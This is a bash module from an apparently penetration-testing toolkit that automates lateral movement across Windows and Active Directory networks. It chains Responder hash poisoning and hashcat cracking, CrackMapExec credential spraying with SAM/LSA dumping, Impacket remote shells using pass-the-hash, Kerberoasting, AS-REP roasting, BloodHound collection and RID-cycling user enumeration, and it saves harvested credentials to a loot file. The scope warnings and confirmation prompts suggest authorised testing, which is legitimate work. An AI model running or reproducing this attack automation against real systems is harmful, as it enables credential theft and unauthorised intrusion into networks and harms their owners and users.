#!/usr/bin/env bash
# modules/04_lateral/lateral_movement.sh
#
# LATERAL MOVEMENT
# Simulates an attacker pivoting from an initial foothold to other systems.
# Requires credentials or hashes captured from prior phases.
#
# Tools and techniques:
#
#   Responder  - Poisons LLMNR/NBT-NS/mDNS broadcast queries to capture
#                NTLMv2 challenge-response hashes passively.
#                Works when any Windows host tries to resolve a non-existent
#                hostname (very common on Windows networks).
#
#   CrackMapExec - Validates credentials against all SMB hosts simultaneously.
#                  Identifies which hosts your creds work on, lists logged-on
#                  users, executes commands.
#
#   Impacket suite:
#     psexec.py   - SMB-based remote execution using ADMIN$ and SVCCTL
#     wmiexec.py  - WMI-based remote execution (less detectable)
#     smbexec.py  - Service-based SMB exec (avoids writing to disk)
#     atexec.py   - Remote execution via Task Scheduler
#     secretsdump - Dump SAM, LSA secrets, NTDS.dit remotely
#     lookupsid   - RID cycling to enumerate domain users without auth
#     GetUserSPNs - Kerberoasting: request service tickets for offline cracking
#
#   BloodHound + SharpHound - Map AD permissions graph to find privilege paths
#
#   Techniques:
#     Pass-the-Hash  - Use NTLM hash directly without cracking
#     Pass-the-Ticket - Use Kerberos ticket (TGT/TGS) for auth
#     Kerberoasting  - Request service tickets and crack offline
#     AS-REP Roasting - Users without pre-auth; get hash without creds

run_module_main() {
    local outdir="${SESSION_DIR}/lateral"
    mkdir -p "${outdir}"
    section "Lateral Movement"

    echo ""
    echo -e "${BOLD}Lateral Movement Modules:${NC}"
    local _resp_tag="${DIM}[internal only]${NC}"
    [[ "${ENGAGEMENT_TYPE}" == "external" ]] && _resp_tag="${RED}[blocked - external engagement]${NC}"
    echo -e "  ${CYAN}1)${NC} Responder - LLMNR/NBT-NS poisoning (passive capture)  ${_resp_tag}"
    echo -e "  ${CYAN}2)${NC} CrackMapExec - Credential spraying across SMB"
    echo -e "  ${CYAN}3)${NC} Impacket - Remote execution (psexec/wmiexec)"
    echo -e "  ${CYAN}4)${NC} Kerberoasting - Request and crack service tickets"
    echo -e "  ${CYAN}5)${NC} BloodHound collection - AD attack path mapping"
    echo -e "  ${CYAN}6)${NC} RID Cycling - User enumeration without credentials"
    echo -e "  ${CYAN}7)${NC} All of the above"
    echo -n "Choice [1-7]: "
    local choice; read -r choice

    case "${choice}" in
        1) lateral_responder ;;
        2) lateral_cme ;;
        3) lateral_impacket ;;
        4) lateral_kerberoast ;;
        5) lateral_bloodhound ;;
        6) lateral_rid_cycle ;;
        7)
            lateral_responder
            lateral_cme
            lateral_impacket
            lateral_kerberoast
            lateral_bloodhound
            lateral_rid_cycle
            ;;
    esac

    success "Lateral movement module complete → ${outdir}"
    log "Lateral movement complete"
}

# ─── Responder ────────────────────────────────────────────────────────────────
lateral_responder() {
    local outdir="${SESSION_DIR}/lateral"

    divider
    echo -e "${BOLD}Responder - LLMNR/NBT-NS Poisoning${NC}"
    echo ""
    explain "LLMNR and NBT-NS are Windows broadcast protocols for name resolution."
    explain "When a Windows host can't find a hostname via DNS, it broadcasts a query."
    explain "Responder intercepts these queries and sends forged responses,"
    explain "causing the victim to authenticate to us - capturing NTLMv2 hashes."
    explain ""
    explain "Then crack offline: hashcat -m 5600 hashes.txt rockyou.txt"
    explain "Or relay (without cracking) using ntlmrelayx.py"
    echo ""

    # External engagement - Responder is not applicable
    if [[ "${ENGAGEMENT_TYPE}" == "external" ]]; then
        echo -e "${RED}${BOLD}  ⚠  NOT APPLICABLE - EXTERNAL ENGAGEMENT${NC}"
        echo ""
        echo -e "${YELLOW}  Responder poisons broadcast traffic on the LOCAL network segment your"
        echo -e "  machine is connected to - not the target's. Against an external target"
        echo -e "  this would only affect your own office or home LAN, not the client."
        echo ""
        echo -e "  This module requires physical or VPN presence on the target's internal"
        echo -e "  network. Re-run showdown with -i if this is an internal engagement.${NC}"
        echo ""
        return
    fi

    # Internal engagement - mandatory pre-flight checklist
    echo -e "${RED}${BOLD}  ⚠  NETWORK IMPACT WARNING${NC}"
    echo ""
    echo -e "${YELLOW}  Responder will poison LLMNR/NBT-NS queries on the entire local segment."
    echo -e "  Every Windows host on the same LAN as this machine may authenticate to"
    echo -e "  you - including hosts outside the agreed target scope."
    echo ""
    echo -e "  Confirm before proceeding:${NC}"
    echo -e "  ${CYAN}[1]${NC} This machine is on the CLIENT's network, not your own office/home LAN"
    echo -e "  ${CYAN}[2]${NC} The client's scope covers broadcast poisoning on this segment"
    echo -e "  ${CYAN}[3]${NC} You know how to remediate if needed - see ${BOLD}sop/REMEDIATION.md${NC}"
    echo ""
    if ! confirm "  All confirmed - proceed with Responder?"; then
        info "Responder skipped."
        return
    fi
    echo ""

    warn "Responder modifies network broadcast responses - coordinate with client"
    warn "Run duration: recommend 10-30 minutes during working hours for best results"
    echo ""

    if ! tool_or_skip responder "LLMNR poisoning"; then return; fi

    # Detect interface
    local iface
    iface=$(ip route | grep default | awk '{print $5}' | head -1)
    if [[ -z "${iface}" ]]; then
        ask "Network interface to listen on (e.g. eth0, ens33):"
        read -r iface
    fi
    info "Interface: ${iface}"

    local run_minutes=15
    ask "How many minutes to run Responder? [default: 15]:"
    read -r duration_input
    [[ "${duration_input}" =~ ^[0-9]+$ ]] && run_minutes="${duration_input}"

    local resp_log="${outdir}/responder_${iface}.txt"
    local resp_dir="/usr/share/responder/logs"

    info "Starting Responder for ${run_minutes} minutes..."
    info "Captures will appear in ${resp_dir}/"
    echo ""

    # Run responder in background, kill after duration
    if [[ "${EUID}" -eq 0 ]]; then
        timeout "$((run_minutes * 60))" responder \
            -I "${iface}" \
            -wrdfP \
            2>&1 | tee "${resp_log}" &
        local resp_pid=$!

        info "Responder PID: ${resp_pid}"
        info "Running for ${run_minutes} minutes... (Ctrl+C to stop early)"

        local elapsed=0
        while kill -0 "${resp_pid}" 2>/dev/null; do
            sleep 30
            elapsed=$((elapsed + 30))
            local captured; captured=$(ls "${resp_dir}"/*.txt 2>/dev/null | xargs grep -l "NTLMv2" 2>/dev/null | wc -l || echo 0)
            info "Elapsed: ${elapsed}s | NTLMv2 hashes captured: ${captured}"
            [[ $((elapsed)) -ge $((run_minutes * 60)) ]] && break
        done

        kill "${resp_pid}" 2>/dev/null || true
        wait "${resp_pid}" 2>/dev/null || true
    else
        warn "Responder requires root. Run: sudo ./showdown.sh"
        return
    fi

    # Collect captured hashes
    local hash_out="${outdir}/responder_hashes.txt"
    if ls "${resp_dir}"/*.txt 2>/dev/null | head -1 | grep -q .; then
        cat "${resp_dir}"/*.txt 2>/dev/null > "${hash_out}" || true
        local hash_count; hash_count=$(grep -c "NTLMv" "${hash_out}" 2>/dev/null || echo 0)

        if [[ "${hash_count}" -gt 0 ]]; then
            success "Captured ${hash_count} NTLMv2 hash(es)"
            append_finding "CRITICAL" \
                "LLMNR poisoning: ${hash_count} NTLMv2 hash(es) captured" \
                "Hashes at ${hash_out} - crack with: hashcat -m 5600 ${hash_out} <wordlist>"
            cat "${hash_out}"

            # Offer to run hashcat
            if confirm "Attempt offline crack with hashcat now?"; then
                local wl; wl=$(wl_passwords)
                if [[ -n "${wl}" ]] && tool_or_skip hashcat "offline hash cracking"; then
                    run_cmd "${outdir}/hashcat_results.txt" hashcat \
                        -m 5600 \
                        "${hash_out}" \
                        "${wl}" \
                        --force \
                        -O \
                        2>/dev/null || true

                    # Save cracked creds
                    if check_tool hashcat; then
                        hashcat -m 5600 "${hash_out}" --show 2>/dev/null | \
                            tee -a "${SESSION_DIR}/loot/credentials.txt" || true
                    fi
                fi
            fi
        else
            info "No hashes captured this session."
        fi
    fi
}

# ─── CrackMapExec ─────────────────────────────────────────────────────────────
lateral_cme() {
    local outdir="${SESSION_DIR}/lateral"

    divider
    echo -e "${BOLD}CrackMapExec - Credential Spraying & Lateral Spread${NC}"
    echo ""
    explain "Tests a credential set against all SMB hosts in scope"
    explain "Pwn3d! = your account has local admin rights on that host"
    explain "Can also: enumerate shares, list logged-on users, run commands/modules"
    echo ""

    local cme_bin; cme_bin=$(command -v crackmapexec 2>/dev/null || command -v cme 2>/dev/null || echo "")
    if [[ -z "${cme_bin}" ]]; then
        warn "crackmapexec not found. Install: apt install crackmapexec"
        return
    fi

    # Load existing creds or prompt
    local cred_line
    cred_line=$(get_credentials)
    [[ -z "${cred_line}" ]] && return

    local user="${cred_line%%:*}"
    local pass_or_hash="${cred_line#*:}"

    local target_file="${SESSION_DIR}/recon/hosts_alive.txt"
    [[ ! -s "${target_file}" ]] && target_file="${SESSION_DIR}/targets.txt"

    local cme_base=("${cme_bin}" smb "${target_file}")

    # Detect hash vs password
    local auth_flags=()
    if [[ "${pass_or_hash}" =~ ^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$ ]]; then
        info "Detected NTLM hash - using Pass-the-Hash"
        auth_flags=(-u "${user}" -H "${pass_or_hash}")
    else
        auth_flags=(-u "${user}" -p "${pass_or_hash}")
    fi

    local out="${outdir}/cme_lateral.txt"

    # Basic auth test
    info "Testing credential validity across all hosts..."
    run_cmd "${out}" "${cme_base[@]}" "${auth_flags[@]}" 2>/dev/null || true

    local pwned; pwned=$(grep -c "Pwn3d\!" "${out}" 2>/dev/null || echo 0)
    if [[ "${pwned}" -gt 0 ]]; then
        append_finding "CRITICAL" \
            "CME: Local admin on ${pwned} host(s) with ${user}" \
            "Pwn3d! hosts in ${out}"
        success "${pwned} host(s) with local admin access!"

        if confirm "Dump SAM/LSA secrets via CME secretsdump?"; then
            run_cmd "${outdir}/cme_secretsdump.txt" \
                "${cme_base[@]}" "${auth_flags[@]}" --sam --lsa \
                2>/dev/null || true

            grep -iE "Administrator|:.*:::" "${outdir}/cme_secretsdump.txt" 2>/dev/null | \
                tee -a "${SESSION_DIR}/loot/credentials.txt" || true
        fi

        if confirm "List all shares on accessible hosts?"; then
            run_cmd "${outdir}/cme_shares.txt" \
                "${cme_base[@]}" "${auth_flags[@]}" --shares \
                2>/dev/null || true
        fi

        if confirm "Enumerate logged-on users on accessible hosts?"; then
            run_cmd "${outdir}/cme_loggedon.txt" \
                "${cme_base[@]}" "${auth_flags[@]}" --loggedon-users \
                2>/dev/null || true
        fi
    else
        info "No local admin access with these credentials."
    fi
}

# ─── Impacket Remote Execution ────────────────────────────────────────────────
lateral_impacket() {
    local outdir="${SESSION_DIR}/lateral"

    divider
    echo -e "${BOLD}Impacket - Remote Execution${NC}"
    echo ""
    explain "psexec.py  - Creates a service via ADMIN$/SVCCTL. Loud - creates event logs"
    explain "wmiexec.py - Uses WMI for execution. Quieter, no service creation"
    explain "smbexec.py - Uses Service Control Manager, outputs via SMB share"
    explain "atexec.py  - Task Scheduler execution. Good for scheduled commands"
    echo ""

    local cred_line; cred_line=$(get_credentials)
    [[ -z "${cred_line}" ]] && return

    local user="${cred_line%%:*}"
    local pass_or_hash="${cred_line#*:}"

    ask "Target host IP for remote execution:"
    read -r target_host
    [[ -z "${target_host}" ]] && return

    echo ""
    echo -e "${BOLD}Execution method:${NC}"
    echo -e "  ${CYAN}1)${NC} wmiexec.py   ${DIM}[recommended - semi-interactive shell]${NC}"
    echo -e "  ${CYAN}2)${NC} psexec.py    ${DIM}[creates service - very loud]${NC}"
    echo -e "  ${CYAN}3)${NC} smbexec.py   ${DIM}[no disk write, uses service]${NC}"
    echo -e "  ${CYAN}4)${NC} atexec.py    ${DIM}[task scheduler, single command]${NC}"
    echo -n "Choice [1-4]: "
    local choice; read -r choice

    # Determine domain context
    local domain="."
    if grep -qi "domain\|CORP\|LAB" "${SESSION_DIR}/exploit/smb/" 2>/dev/null; then
        ask "Domain (or '.' for local): "
        read -r domain
    fi

    local auth_str
    if [[ "${pass_or_hash}" =~ ^[0-9a-fA-F]{32} ]]; then
        auth_str="${domain}/${user}@${target_host} -hashes :${pass_or_hash}"
    else
        auth_str="${domain}/${user}:${pass_or_hash}@${target_host}"
    fi

    local out="${outdir}/impacket_exec_${target_host}.txt"

    case "${choice}" in
        1)
            info "wmiexec → semi-interactive shell on ${target_host}"
            info "Type commands at the prompt. 'exit' to quit."
            info "Commands and output saved to ${out}"
            if check_tool wmiexec.py; then
                script -q -c "wmiexec.py ${auth_str}" "${out}" 2>/dev/null || true
            else
                warn "wmiexec.py not found - try: apt install python3-impacket"
            fi
            ;;
        2)
            info "psexec → interactive SYSTEM shell on ${target_host}"
            warn "This creates a service in the Windows Event Log - very detectable"
            if check_tool psexec.py; then
                script -q -c "psexec.py ${auth_str}" "${out}" 2>/dev/null || true
            fi
            ;;
        3)
            if check_tool smbexec.py; then
                script -q -c "smbexec.py ${auth_str}" "${out}" 2>/dev/null || true
            fi
            ;;
        4)
            ask "Command to execute remotely:"
            read -r cmd
            if check_tool atexec.py; then
                run_cmd "${out}" atexec.py ${auth_str} "${cmd}" 2>/dev/null || true
            fi
            ;;
    esac

    if [[ -s "${out}" ]]; then
        append_finding "CRITICAL" \
            "Remote code execution on ${target_host} as ${user}" \
            "Session transcript in ${out}"
    fi
}

# ─── Kerberoasting ────────────────────────────────────────────────────────────
lateral_kerberoast() {
    local outdir="${SESSION_DIR}/lateral"

    divider
    echo -e "${BOLD}Kerberoasting - Offline Service Ticket Cracking${NC}"
    echo ""
    explain "Any authenticated domain user can request a service ticket (TGS) for any SPN."
    explain "The TGS is encrypted with the service account's NTLM hash."
    explain "We export the ticket and crack it offline - no lockout possible."
    explain "High-value service accounts (SQL, Exchange, backups) often have weak passwords."
    echo ""
    explain "GetUserSPNs.py requests tickets for all SPNs in the domain."
    explain "Crack with: hashcat -m 13100 kerberoast.txt rockyou.txt"
    echo ""

    if ! check_tool GetUserSPNs.py && ! check_tool impacket-GetUserSPNs; then
        warn "GetUserSPNs.py not found. Install: apt install python3-impacket"
        return
    fi

    local spn_bin; spn_bin=$(command -v GetUserSPNs.py 2>/dev/null || command -v impacket-GetUserSPNs 2>/dev/null)

    local cred_line; cred_line=$(get_credentials)
    [[ -z "${cred_line}" ]] && return

    local user="${cred_line%%:*}"
    local pass="${cred_line#*:}"

    ask "Domain name (e.g. corp.local):"
    read -r domain
    [[ -z "${domain}" ]] && return

    ask "DC IP address:"
    read -r dc_ip
    [[ -z "${dc_ip}" ]] && return

    local out="${outdir}/kerberoast_hashes.txt"

    info "Requesting service tickets for all SPNs..."
    run_cmd "${out}" "${spn_bin}" \
        "${domain}/${user}:${pass}" \
        -dc-ip "${dc_ip}" \
        -request \
        -outputfile "${out}" \
        2>/dev/null || true

    local ticket_count; ticket_count=$(grep -c "krb5tgs" "${out}" 2>/dev/null || echo 0)
    if [[ "${ticket_count}" -gt 0 ]]; then
        success "Got ${ticket_count} Kerberos ticket(s) for offline cracking"
        append_finding "HIGH" \
            "Kerberoastable SPNs found: ${ticket_count} tickets" \
            "Hashes at ${out} - crack with: hashcat -m 13100 ${out} <wordlist>"

        if confirm "Attempt offline crack with hashcat now?"; then
            local wl; wl=$(wl_passwords)
            if [[ -n "${wl}" ]] && tool_or_skip hashcat "offline cracking"; then
                run_cmd "${outdir}/hashcat_kerberoast.txt" hashcat \
                    -m 13100 "${out}" "${wl}" --force -O 2>/dev/null || true
            fi
        fi
    else
        info "No Kerberoastable SPNs found."
    fi

    # AS-REP Roasting (no-preauth users)
    if confirm "Also check AS-REP Roasting (users without pre-auth)?"; then
        local asrep_bin; asrep_bin=$(command -v GetNPUsers.py 2>/dev/null || command -v impacket-GetNPUsers 2>/dev/null || echo "")
        if [[ -n "${asrep_bin}" ]]; then
            local asrep_out="${outdir}/asrep_hashes.txt"
            run_cmd "${asrep_out}" "${asrep_bin}" \
                "${domain}/" \
                -usersfile "${SESSION_DIR}/loot/usernames.txt" \
                -dc-ip "${dc_ip}" \
                -format hashcat \
                -outputfile "${asrep_out}" \
                2>/dev/null || true

            if grep -q "krb5asrep" "${asrep_out}" 2>/dev/null; then
                append_finding "HIGH" "AS-REP Roastable accounts found" \
                    "Hashes at ${asrep_out} - crack with: hashcat -m 18200"
            fi
        fi
    fi
}

# ─── BloodHound Collection ────────────────────────────────────────────────────
lateral_bloodhound() {
    local outdir="${SESSION_DIR}/lateral/bloodhound"
    mkdir -p "${outdir}"

    divider
    echo -e "${BOLD}BloodHound - Active Directory Attack Path Mapping${NC}"
    echo ""
    explain "BloodHound visualises AD as a graph: users, groups, computers, ACLs."
    explain "It finds the shortest privilege escalation path to Domain Admin."
    explain "Collection uses SharpHound (Windows) or bloodhound-python (Linux)."
    explain ""
    explain "After collection: open BloodHound GUI → import ZIP → run queries"
    explain "Key query: 'Shortest Paths to Domain Admins from Owned Principals'"
    echo ""

    local cred_line; cred_line=$(get_credentials)
    [[ -z "${cred_line}" ]] && return

    local user="${cred_line%%:*}"
    local pass="${cred_line#*:}"

    ask "Domain (e.g. corp.local):"
    read -r domain
    ask "DC IP:"
    read -r dc_ip

    if tool_or_skip bloodhound-python "AD collection"; then
        info "Running bloodhound-python collector..."
        run_cmd "${outdir}/bloodhound_collection.log" bloodhound-python \
            -d "${domain}" \
            -u "${user}" \
            -p "${pass}" \
            -ns "${dc_ip}" \
            -c All \
            -o "${outdir}" \
            2>/dev/null || true

        local zip_count; zip_count=$(ls "${outdir}"/*.zip 2>/dev/null | wc -l || echo 0)
        if [[ "${zip_count}" -gt 0 ]]; then
            success "BloodHound data collected → ${outdir}"
            append_finding "INFO" "BloodHound data collected for ${domain}" \
                "Import ${outdir}/*.zip into BloodHound GUI for attack path analysis"
        fi
    else
        warn "bloodhound-python not found. Install: pip3 install bloodhound"
        info "Alternative: drop SharpHound.exe on a Windows host and collect there"
        info "Download: https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe"
    fi
}

# ─── RID Cycling ──────────────────────────────────────────────────────────────
lateral_rid_cycle() {
    local outdir="${SESSION_DIR}/lateral"

    divider
    echo -e "${BOLD}RID Cycling - User Enumeration via SMB (lookupsid)${NC}"
    echo ""
    explain "Windows assigns each user/group a Relative ID (RID)."
    explain "lookupsid.py queries each RID (500-5000) to enumerate all users/groups."
    explain "Works with null session or any domain user - harvests full user list."
    echo ""

    if ! check_tool lookupsid.py && ! check_tool impacket-lookupsid; then
        warn "lookupsid.py not found. Install: pip3 install impacket"
        return
    fi

    local lsid_bin; lsid_bin=$(command -v lookupsid.py 2>/dev/null || command -v impacket-lookupsid 2>/dev/null)

    ask "Target DC or SMB host IP:"
    read -r target_ip
    [[ -z "${target_ip}" ]] && return

    local cred_line; cred_line=$(get_credentials_optional)

    local auth_str="guest:@${target_ip}"
    if [[ -n "${cred_line}" ]]; then
        local user="${cred_line%%:*}"
        local pass="${cred_line#*:}"
        auth_str="${user}:${pass}@${target_ip}"
    fi

    local out="${outdir}/rid_cycle_${target_ip}.txt"
    run_cmd "${out}" "${lsid_bin}" "${auth_str}" 2>/dev/null || true

    # Extract usernames
    grep -oP '(?<=SidTypeUser\) )\S+' "${out}" 2>/dev/null | \
        sed 's/.*\\//' | \
        tee -a "${SESSION_DIR}/loot/usernames.txt" | \
        wc -l | xargs -I{} info "RID cycle: {} user accounts found"

    sort -u "${SESSION_DIR}/loot/usernames.txt" -o "${SESSION_DIR}/loot/usernames.txt" 2>/dev/null || true
}

# ─── Credential helpers ───────────────────────────────────────────────────────
get_credentials() {
    local cred_file="${SESSION_DIR}/loot/credentials.txt"
    if [[ -s "${cred_file}" ]]; then
        info "Credentials from previous phases:"
        cat "${cred_file}"
        echo ""
        if confirm "Use first credential above?"; then
            head -1 "${cred_file}" | awk '{print $NF}' | tr -d '[]'
            return
        fi
    fi
    ask "Enter credential (user:password or user:NTLMhash):"
    read -r cred
    echo "${cred}"
}

get_credentials_optional() {
    local cred_file="${SESSION_DIR}/loot/credentials.txt"
    if [[ -s "${cred_file}" ]]; then
        if confirm "Use captured credentials? (no = try null/guest session)"; then
            head -1 "${cred_file}" | awk '{print $NF}' | tr -d '[]'
            return
        fi
    fi
    echo ""  # empty = use null session
}
